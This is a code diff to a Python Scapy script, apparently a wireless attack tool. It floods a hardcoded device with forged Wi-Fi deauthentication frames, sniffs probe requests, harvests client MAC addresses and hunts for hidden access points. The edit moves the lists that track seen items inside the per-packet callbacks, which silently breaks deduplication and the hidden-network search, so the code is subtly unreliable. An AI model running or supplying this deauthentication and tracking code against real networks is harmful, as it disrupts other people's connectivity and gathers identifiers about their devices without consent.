@@ -5,10 +5,11 @@ from scapy.all import *
 interface= "wlx00c0ca84aba2"
 ap_mac = "e0:22:04:2f:4d:0e"
 device_mac = "60:be:b5:f0:23:b1"
-probeReqs = []
-macAddresses = []
+
 
 def sniff_probe_requests(pkt):
+	probeReqs = []
+
 	if pkt.haslayer(Dot11ProbeReq):
 		netName = pkt.getlayer(Dot11ProbeReq).info
 		if netName not in probeReqs:
@@ -16,12 +17,29 @@ def sniff_probe_requests(pkt):
 			print "[+] Detected new probe request: " + netName
 
 def sniff_all_mac_addresses(pkt):
+	macAddresses = []
+
 	if pkt.haslayer(Dot11):
-		
 		layer = pkt.getlayer(Dot11)
 		if layer.addr2 and (layer.addr2 not in macAddresses) and layer.addr1 == ap_mac:
 			macAddresses.append(layer.addr2)
 			print "[+] Detected new mac address: " + layer.addr2
+
+def find_hidden_ap(pkt):
+	hidden_aps = []
+	aps = []
+
+	if pkt.haslayer(Dot11ProbeResp):
+		addr2 = pkt.getlayer(Dot11).addr2
+		if (addr2 in hidden_aps) and (addr2 not in aps):
+			name = pkt.getlayer(Dot11ProbeResp).info
+			print '[+]' + name + ' ' + addr2
+			aps.append(addr2)
+	if pkt.haslayer(Dot11Beacon):
+		if pkt.getlayer(Dot11).info == '':
+			addr2 = pkt.getlayer(Dot11).addr2
+			if addr2 not in hidden_aps:
+				hidden_aps.append(addr2)
 
 def get_probe_requests():
     print "getting probe requests.."
@@ -37,16 +55,28 @@ def deauth_device():
 	pkt = RadioTap() / Dot11( addr1=ap_mac, addr2=device_mac, addr3=device_mac) / Dot11Deauth() 
 	sendp(pkt, iface=interface, count=1000, inter=1)
 
-def setup_nic():
-	os.system("sudo ifconfig " + interface + " down")
-	os.system("sudo iwconfig " + interface + " mode monitor")
-	os.system("sudo ifconfig " + interface + " up")
 
-if sys.argv[1] == '-d':
-	deauth_device()
-elif sys.argv[1] == '-g':
-	get_all_mac_addresses()
-elif sys.argv[1] == '-p':
-	get_probe_requests()
-elif sys.argv[1] == '-s':
-	setup_nic()
+def find_all_hidden_aps():
+	print "finding hidden ap's.."
+	sniff(iface=interface, prn=find_hidden_ap)
+
+
+def setup_nic():
+	os.system('sudo ifconfig ' + interface + ' down')
+	os.system('sudo iwconfig ' + interface + ' mode monitor')
+	os.system('sudo ifconfig ' + interface + ' up')
+
+def main():
+	if sys.argv[1] == '-d':
+		deauth_device()
+	elif sys.argv[1] == '-g':
+		get_all_mac_addresses()
+	elif sys.argv[1] == '-p':
+		get_probe_requests()
+	elif sys.argv[1] == '-s':
+		setup_nic()
+	elif sys.argv[1] == '-h':
+		find_all_hidden_aps()
+
+if __name__ == "__main__":
+    main()
